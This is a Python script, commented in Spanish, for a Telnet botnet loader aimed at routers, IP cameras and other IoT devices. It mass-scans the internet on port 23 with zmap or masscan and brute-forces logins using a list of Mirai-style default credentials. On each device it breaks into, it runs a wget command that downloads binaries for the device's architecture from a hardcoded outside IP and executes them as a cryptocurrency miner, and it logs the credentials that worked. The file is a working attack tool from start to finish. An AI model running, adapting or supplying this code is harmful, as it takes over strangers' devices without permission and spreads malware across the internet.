#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import os
import sys
import time
import threading
import telnetlib
import socket
from datetime import datetime
import random
import ipaddress

class TelnetHijacker:
    def __init__(self):
        self.output_file = f"telnet_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.alive_file = "telnet_alive.txt"
        self.success_file = "telnet_hijacked.txt"
        self.attack_time = 600  # 10 minutos en segundos
        self.payload_url = "http://172.96.140.62:1283/bins/$b -O .x"
        
        # Combinaciones de credenciales para Telnet
        self.credenciales = [
            ("root", ""),
            ("root", "root"),
            ("root", "admin"),
            ("root", "1234"),
            ("root", "12345"),
            ("root", "password"),
            ("root", "default"),
            ("root", "123456"),
            ("admin", ""),
            ("admin", "admin"),
            ("admin", "1234"),
            ("admin", "12345"),
            ("admin", "password"),
            ("admin", "default"),
            ("admin", "123456"),
            ("support", ""),
            ("user", "user"),
            ("user", ""),
            ("guest", ""),
            ("guest", "guest"),
            ("supervisor", "supervisor"),
            ("tech", "tech"),
            ("telnet", "telnet"),
            ("root", "Zte521"),
            ("root", "xc3511"),
            ("root", "vizxv"),
            ("root", "anko"),
            ("root", "5up"),
            ("root", "7ujMko0admin"),
            ("root", "realtek"),
            ("root", "00000000"),
            ("root", "1111"),
            ("root", "1111111"),
            ("root", "12341234"),
            ("root", "123456789"),
            ("root", "54321"),
            ("root", "666666"),
            ("root", "7ujMko0vizxv"),
            ("root", "7ujMko0admin"),
            ("root", "888888"),
            ("root", "admin1234"),
            ("root", "defaultpassword"),
            ("root", "hi3518"),
            ("root", "hikvision"),
            ("root", "ipcam"),
            ("root", "juantech"),
            ("root", "klv1234"),
            ("root", "klv123"),
            ("root", "pass"),
            ("root", "service"),
            ("root", "system"),
            ("root", "user"),
            ("root", "xc3511"),
            ("admin", "1111"),
            ("admin", "1111111"),
            ("admin", "12341234"),
            ("admin", "123456789"),
            ("admin", "54321"),
            ("admin", "666666"),
            ("admin", "888888"),
            ("admin", "admin1234"),
            ("admin", "defaultpassword"),
            ("admin", "hi3518"),
        ]
        
    def check_root(self):
        """Verificar si es root (necesario para zmap)"""
        if os.geteuid() != 0:
            print("❌ ERROR: Necesitas ejecutar como root (sudo)")
            print("   sudo python3 telnet_hijacker.py")
            sys.exit(1)
    
    def instalar_zmap(self):
        """Instalar zmap si no está instalado"""
        try:
            subprocess.run(["which", "zmap"], check=True, capture_output=True)
            print("✅ ZMAP ya está instalado")
            return True
        except:
            print("📦 Instalando ZMAP...")
            try:
                subprocess.run(["apt-get", "update", "-y"], check=False)
                subprocess.run(["apt-get", "install", "zmap", "-y"], check=False)
                print("✅ ZMAP instalado")
                return True
            except Exception as e:
                print(f"❌ Error instalando ZMAP: {e}")
                return False
    
    def verificar_ip_valida(self, ip):
        """Verificar si una IP es válida"""
        try:
            ipaddress.ip_address(ip.strip())
            return True
        except:
            return False
    
    def escaneo_con_zmap_directo(self):
        """Escaneo directo con ZMAP usando diferentes opciones"""
        print("\n" + "="*60)
        print("🔍 INICIANDO ESCANEO CON ZMAP - PUERTO 23")
        print("="*60)
        
        # Diferentes estrategias de escaneo
        estrategias = [
            # Estrategia 1: Escaneo completo de Internet
            {
                "name": "Internet completo",
                "cmd": [
                    "zmap",
                    "--target-port=23",
                    "--rate=10000",
                    "--output-file=zmap_output_1.txt",
                    "--max-targets=0",
                    "--cooldown-time=3",
                    "--retries=1",
                    "--no-cleanup",
                    "--quiet"
                ]
            },
            # Estrategia 2: Rangos específicos con muchos dispositivos IoT
            {
                "name": "Rangos IoT",
                "cmd": [
                    "zmap",
                    "--target-port=23",
                    "--rate=10000",
                    "--output-file=zmap_output_2.txt",
                    "--whitelist-file=rangos_iot.txt",
                    "--cooldown-time=3",
                    "--retries=1",
                    "--quiet"
                ]
            },
            # Estrategia 3: Escaneo de red local
            {
                "name": "Red local",
                "cmd": [
                    "zmap",
                    "--target-port=23",
                    "--rate=1000",
                    "--output-file=zmap_output_3.txt",
                    "--subnet=192.168.0.0/16,10.0.0.0/8,172.16.0.0/12",
                    "--cooldown-time=2",
                    "--retries=0",
                    "--quiet"
                ]
            }
        ]
        
        # Crear archivo de rangos IoT si no existe
        if not os.path.exists("rangos_iot.txt"):
            with open("rangos_iot.txt", "w") as f:
                f.write("181.0.0.0/8\n")    # Latinoamérica
                f.write("186.0.0.0/8\n")    # Latinoamérica
                f.write("187.0.0.0/8\n")    # Latinoamérica
                f.write("189.0.0.0/8\n")    # Latinoamérica
                f.write("191.0.0.0/8\n")    # Latinoamérica
                f.write("200.0.0.0/8\n")    # Latinoamérica
                f.write("201.0.0.0/8\n")    # Latinoamérica
                f.write("177.0.0.0/8\n")    # Brasil
                f.write("179.0.0.0/8\n")    # Brasil
                f.write("138.0.0.0/8\n")    # Varios
                f.write("45.0.0.0/8\n")     # Varios
                f.write("5.0.0.0/8\n")      # Europa
                f.write("31.0.0.0/8\n")     # Europa
                f.write("37.0.0.0/8\n")     # Europa
                f.write("77.0.0.0/8\n")     # Europa
                f.write("79.0.0.0/8\n")     # Europa
                f.write("81.0.0.0/8\n")     # Europa
                f.write("82.0.0.0/8\n")     # Europa
                f.write("83.0.0.0/8\n")     # Europa
                f.write("84.0.0.0/8\n")     # Europa
                f.write("85.0.0.0/8\n")     # Europa
                f.write("86.0.0.0/8\n")     # Europa
                f.write("87.0.0.0/8\n")     # Europa
                f.write("88.0.0.0/8\n")     # Europa
                f.write("89.0.0.0/8\n")     # Europa
                f.write("90.0.0.0/8\n")     # Europa
                f.write("91.0.0.0/8\n")     # Europa
                f.write("92.0.0.0/8\n")     # Europa
                f.write("93.0.0.0/8\n")     # Europa
                f.write("94.0.0.0/8\n")     # Europa
                f.write("95.0.0.0/8\n")     # Europa
                f.write("213.0.0.0/8\n")    # Europa
                f.write("217.0.0.0/8\n")    # Europa
        
        todas_ips = []
        
        for estrategia in estrategias:
            print(f"\n📡 Probando estrategia: {estrategia['name']}")
            try:
                # Limpiar archivo de salida
                if os.path.exists(estrategia['cmd'][estrategia['cmd'].index('--output-file') + 1]):
                    os.remove(estrategia['cmd'][estrategia['cmd'].index('--output-file') + 1])
                
                # Ejecutar ZMAP
                print(f"   Ejecutando comando: {' '.join(estrategia['cmd'][:6])}...")
                
                process = subprocess.Popen(
                    estrategia['cmd'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True
                )
                
                # Esperar 30 segundos para resultados
                time.sleep(30)
                
                if process.poll() is None:
                    process.terminate()
                    time.sleep(2)
                
                # Leer resultados
                output_file = estrategia['cmd'][estrategia['cmd'].index('--output-file') + 1]
                
                if os.path.exists(output_file):
                    with open(output_file, 'r') as f:
                        ips = f.readlines()
                    
                    # Filtrar IPs válidas
                    ips_validas = [ip.strip() for ip in ips if self.verificar_ip_valida(ip.strip())]
                    
                    print(f"   ✅ Encontradas {len(ips_validas)} IPs con puerto 23 abierto")
                    todas_ips.extend(ips_validas)
                    
                    # Guardar inmediatamente
                    with open(self.alive_file, 'a') as f:
                        for ip in ips_validas:
                            f.write(f"{ip}\n")
                    
                    with open(self.output_file, 'a') as f:
                        for ip in ips_validas:
                            f.write(f"{ip}\n")
                else:
                    print(f"   ❌ No se generó archivo de salida")
                    
            except Exception as e:
                print(f"   ❌ Error: {e}")
                continue
        
        # Eliminar duplicados
        todas_ips = list(set(todas_ips))
        
        if todas_ips:
            print(f"\n✅ TOTAL: {len(todas_ips)} IPs con puerto 23 abierto")
            return todas_ips
        else:
            print("\n⚠️  No se encontraron IPs con ZMAP")
            return []
    
    def escaneo_alternativo_masscan(self):
        """Usar masscan como alternativa a ZMAP"""
        print("\n" + "="*60)
        print("🔍 USANDO MASSCAN COMO ALTERNATIVA")
        print("="*60)
        
        # Verificar si masscan está instalado
        try:
            subprocess.run(["which", "masscan"], check=True, capture_output=True)
            print("✅ MASSCAN ya está instalado")
        except:
            print("📦 Instalando MASSCAN...")
            subprocess.run(["apt-get", "update", "-y"], check=False)
            subprocess.run(["apt-get", "install", "masscan", "-y"], check=False)
        
        try:
            # Escaneo rápido con masscan
            cmd = [
                "masscan",
                "0.0.0.0/0",
                "-p23",
                "--rate=10000",
                "--output-format=list",
                "--output-file=masscan_output.txt"
            ]
            
            print("🚀 Escaneando con masscan... (30 segundos)")
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            time.sleep(30)
            
            if process.poll() is None:
                process.terminate()
            
            # Leer resultados
            ips = []
            if os.path.exists("masscan_output.txt"):
                with open("masscan_output.txt", 'r') as f:
                    for line in f:
                        if "23/tcp" in line:
                            ip = line.split()[-1]
                            if self.verificar_ip_valida(ip):
                                ips.append(ip)
            
            print(f"✅ MASSCAN encontró {len(ips)} IPs")
            
            # Guardar resultados
            with open(self.alive_file, 'a') as f:
                for ip in ips:
                    f.write(f"{ip}\n")
            
            with open(self.output_file, 'a') as f:
                for ip in ips:
                    f.write(f"{ip}\n")
            
            return ips
            
        except Exception as e:
            print(f"❌ Error con masscan: {e}")
            return []
    
    def escaneo_tcp_simple(self):
        """Escaneo TCP simple para verificar conectividad"""
        print("\n" + "="*60)
        print("🔍 VERIFICANDO CONEXIÓN BÁSICA")
        print("="*60)
        
        # Probar conexión a Internet
        try:
            socket.gethostbyname("google.com")
            print("✅ Conexión a Internet OK")
        except:
            print("❌ Sin conexión a Internet")
            return []
        
        # Probar si el puerto 23 local está abierto
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex(('127.0.0.1', 23))
            if result == 0:
                print("✅ Puerto 23 local abierto")
            else:
                print("ℹ️  Puerto 23 local cerrado (normal)")
            sock.close()
        except:
            pass
        
        return []
    
    def intentar_login(self, ip, port=23):
        """Intentar login con combinaciones de credenciales"""
        for user, password in self.credenciales:
            try:
                tn = telnetlib.Telnet(ip, port, timeout=3)
                
                try:
                    # Esperar login prompt
                    tn.read_until(b"login: ", timeout=2)
                    tn.write(user.encode('ascii') + b"\n")
                    
                    # Esperar password prompt
                    tn.read_until(b"Password: ", timeout=2)
                    tn.write(password.encode('ascii') + b"\n")
                    
                    # Verificar si entramos
                    time.sleep(1)
                    result = tn.read_very_eager()
                    
                    # Buscar indicadores de shell exitoso
                    if b"#" in result or b"$" in result or b">" in result:
                        print(f"\n✅ ACCESO CONSEGUIDO - {ip}")
                        print(f"   👤 Usuario: {user}")
                        print(f"   🔑 Password: {password}")
                        
                        # Guardar credenciales exitosas
                        with open(self.success_file, 'a') as f:
                            f.write(f"{ip}:{port}:{user}:{password}\n")
                        
                        return tn, user, password
                        
                except Exception as e:
                    tn.close()
                    continue
                    
            except Exception as e:
                continue
        
        return None, None, None
    
    def detectar_arquitectura(self, tn):
        """Detectar arquitectura del dispositivo"""
        try:
            # Comandos para detectar arquitectura
            tn.write(b"uname -m\n")
            time.sleep(1)
            arch = tn.read_very_eager().decode('utf-8', errors='ignore').strip()
            
            if "x86_64" in arch:
                return "x86_64"
            elif "i386" in arch or "i686" in arch or "i86" in arch:
                return "x86"
            elif "armv7" in arch:
                return "arm7"
            elif "armv6" in arch:
                return "arm6"
            elif "armv5" in arch:
                return "arm5"
            elif "aarch64" in arch or "arm64" in arch:
                return "aarch64"
            elif "mips" in arch:
                if "el" in arch:
                    return "mipsel"
                else:
                    return "mips"
            else:
                return "x86_64"
                
        except:
            return "x86_64"
    
    def desplegar_payload(self, tn, ip, user, password):
        """Desplegar y ejecutar el payload"""
        try:
            print(f"   🔧 Desplegando payload en {ip}...")
            
            # Limpiar y preparar
            tn.write(b"cd /tmp || cd /var/run || cd /dev/shm\n")
            time.sleep(0.5)
            
            # Matar procesos anteriores
            tn.write(b"killall .x 2>/dev/null\n")
            time.sleep(0.5)
            
            # Detectar arquitectura
            arch = self.detectar_arquitectura(tn)
            print(f"   🖥️  Arquitectura detectada: {arch}")
            
            # Comando completo adaptado
            if arch == "x86_64":
                cmd = b"wget -q http://172.96.140.62:1283/bins/x86_64 -O .x && chmod +x .x && ./.x &\n"
            elif arch == "x86":
                cmd = b"wget -q http://172.96.140.62:1283/bins/x86 -O .x && chmod +x .x && ./.x &\n"
            elif arch == "arm7":
                cmd = b"wget -q http://172.96.140.62:1283/bins/arm7 -O .x && chmod +x .x && ./.x &\n"
            elif arch == "arm6":
                cmd = b"wget -q http://172.96.140.62:1283/bins/arm6 -O .x && chmod +x .x && ./.x &\n"
            elif arch == "arm5":
                cmd = b"wget -q http://172.96.140.62:1283/bins/arm5 -O .x && chmod +x .x && ./.x &\n"
            elif arch == "aarch64":
                cmd = b"wget -q http://172.96.140.62:1283/bins/aarch64 -O .x && chmod +x .x && ./.x &\n"
            elif arch == "mips":
                cmd = b"wget -q http://172.96.140.62:1283/bins/mips -O .x && chmod +x .x && ./.x &\n"
            elif arch == "mipsel":
                cmd = b"wget -q http://172.96.140.62:1283/bins/mipsel -O .x && chmod +x .x && ./.x &\n"
            else:
                cmd = b"wget -q http://172.96.140.62:1283/bins/x86_64 -O .x && chmod +x .x && ./.x &\n"
            
            # Enviar comando
            tn.write(cmd)
            time.sleep(2)
            
            # Verificar que el proceso está corriendo
            tn.write(b"ps | grep .x\n")
            time.sleep(1)
            result = tn.read_very_eager().decode('utf-8', errors='ignore')
            
            if ".x" in result:
                print(f"   ✅ PAYLOAD ACTIVADO - Minando por 10 minutos")
                print(f"   ⏱️  Tiempo restante: 600s")
                
                # Registrar éxito
                with open("hijack_success.txt", 'a') as f:
                    f.write(f"{ip}:{user}:{password}:{arch}:{datetime.now()}\n")
                
                # Mantener conexión por 10 minutos
                for i in range(10, 0, -1):
                    time.sleep(60)
                    print(f"   ⏳ Minando... {i} minutos restantes")
                    tn.write(b"echo 'keepalive' > /dev/null 2>&1\n")
                
                return True
            else:
                print(f"   ⚠️  No se pudo verificar ejecución")
                return False
                
        except Exception as e:
            print(f"   ❌ Error desplegando: {e}")
            return False
    
    def atacar_ips(self, ips, max_threads=50):
        """Atacar múltiples IPs concurrentemente"""
        if not ips:
            print("❌ No hay IPs para atacar")
            return
            
        print(f"\n🔪 INICIANDO ATAQUE A {len(ips)} DISPOSITIVOS")
        print(f"⚡ Usando {max_threads} hilos concurrentes")
        print("="*60)
        
        threads = []
        hijacked = 0
        
        for i, ip in enumerate(ips[:1000]):  # Limitar a 1000 IPs
            ip = ip.strip()
            if not ip or not self.verificar_ip_valida(ip):
                continue
                
            thread = threading.Thread(
                target=self.hijack_device,
                args=(ip,)
            )
            threads.append(thread)
            thread.start()
            
            # Control de hilos
            while len([t for t in threads if t.is_alive()]) >= max_threads:
                time.sleep(0.1)
            
            if (i+1) % 10 == 0:
                print(f"   📡 Escaneando... {i+1}/{len(ips)}")
        
        # Esperar que terminen todos
        for thread in threads:
            thread.join()
    
    def hijack_device(self, ip):
        """Hijackear un dispositivo individual"""
        try:
            # Intentar login
            tn, user, password = self.intentar_login(ip)
            
            if tn:
                # Desplegar payload
                if self.desplegar_payload(tn, ip, user, password):
                    print(f"   🎯 {ip} - HIJACKEADO EXITOSAMENTE")
                    tn.write(b"exit\n")
                
                tn.close()
                
        except Exception as e:
            pass
    
    def cargar_ips_guardadas(self):
        """Cargar IPs previamente escaneadas"""
        ips = []
        
        # Buscar archivos de resultados existentes
        archivos = ["telnet_alive.txt", "zmap_output_1.txt", "zmap_output_2.txt", 
                   "zmap_output_3.txt", "masscan_output.txt"]
        
        for archivo in archivos:
            if os.path.exists(archivo):
                try:
                    with open(archivo, 'r') as f:
                        for line in f:
                            ip = line.strip()
                            if self.verificar_ip_valida(ip):
                                ips.append(ip)
                    print(f"✅ Cargadas IPs de {archivo}")
                except:
                    pass
        
        return list(set(ips))
    
    def run(self):
        """Ejecutar escaneo completo"""
        print("="*60)
        print("🔥 TELNET HIJACKER - BUSCADOR DE DISPOSITIVOS")
        print("="*60)
        print("🎯 Objetivo: Routers, cámaras IP, IoT, etc")
        print("⚙️  Payload: Minería por 10 minutos")
        print("="*60)
        
        # Verificar root
        self.check_root()
        
        # Primero, verificar si hay IPs guardadas
        ips_guardadas = self.cargar_ips_guardadas()
        
        if ips_guardadas:
            print(f"\n📂 Encontradas {len(ips_guardadas)} IPs de escaneos anteriores")
            usar_guardadas = input("¿Usar IPs guardadas? (s/n): ").lower()
            if usar_guardadas == 's':
                ips = ips_guardadas
            else:
                ips = []
        else:
            ips = []
        
        if not ips:
            # Probar diferentes métodos de escaneo
            print("\n🔍 NO HAY IPs GUARDADAS - INICIANDO ESCANEO")
            print("   Probando múltiples métodos...")
            
            # Método 1: ZMAP con diferentes estrategias
            ips_zmap = self.escaneo_con_zmap_directo()
            
            # Método 2: MASSCAN
            if not ips_zmap:
                ips_masscan = self.escaneo_alternativo_masscan()
                ips = ips_masscan
            else:
                ips = ips_zmap
            
            # Método 3: Verificación básica
            if not ips:
                self.escaneo_tcp_simple()
                
                # Si no hay resultados, preguntar si quiere probar con IPs de prueba
                print("\n⚠️  No se encontraron dispositivos automáticamente")
                print("   Posibles razones:")
                print("   - El firewall del VPS bloquea escaneos")
                print("   - ZMAP no tiene permisos de red")
                print("   - No hay dispositivos vulnerables en los rangos escaneados")
                
                probar_manual = input("\n¿Quieres introducir IPs manualmente? (s/n): ")
                if probar_manual.lower() == 's':
                    ips_manual = []
                    print("Introduce IPs (una por línea, Enter vacío para terminar):")
                    while True:
                        ip = input("IP: ").strip()
                        if not ip:
                            break
                        if self.verificar_ip_valida(ip):
                            ips_manual.append(ip)
                            print(f"✅ IP válida añadida: {ip}")
                        else:
                            print(f"❌ IP inválida: {ip}")
                    
                    ips = ips_manual
        
        if ips:
            print(f"\n📊 TOTAL IPs A PROCESAR: {len(ips)}")
            
            # Mostrar primeras 10 IPs
            print("\n📋 Primeras 10 IPs:")
            for i, ip in enumerate(ips[:10], 1):
                print(f"   {i}. {ip}")
            
            # Atacar dispositivos
            self.atacar_ips(ips)
            
            print("\n" + "="*60)
            print("📊 RESUMEN FINAL")
            print("="*60)
            
            if os.path.exists(self.success_file):
                with open(self.success_file, 'r') as f:
                    hijacked = f.readlines()
                print(f"✅ Dispositivos hijackeados: {len(hijacked)}")
                print(f"📁 Lista guardada en: {self.success_file}")
                
                if hijacked:
                    print("\n🎯 Dispositivos comprometidos:")
                    for i, line in enumerate(hijacked[-10:], 1):
                        print(f"   {i}. {line.strip()}")
            
            print("\n🎯 Ataque completado")
        else:
            print("\n❌ No se encontraron ni cargaron IPs")
            print("\n📝 Soluciones:")
            print("   1. Verifica que el VPS tenga permisos de escaneo:")
            print("      sudo sysctl -w net.ipv4.ping_group_range=\"0 2147483647\"")
            print("   2. Desactiva firewall temporalmente:")
            print("      sudo ufw disable")
            print("   3. Prueba con masscan directamente:")
            print("      sudo masscan 0.0.0.0/0 -p23 --rate=1000")
            print("   4. Si todo falla, usa IPs manuales")

if __name__ == "__main__":
    hijacker = TelnetHijacker()
    
    try:
        hijacker.run()
    except KeyboardInterrupt:
        print("\n\n⛔ Ataque interrumpido por el usuario")
    except Exception as e:
        print(f"\n❌ Error fatal: {e}")
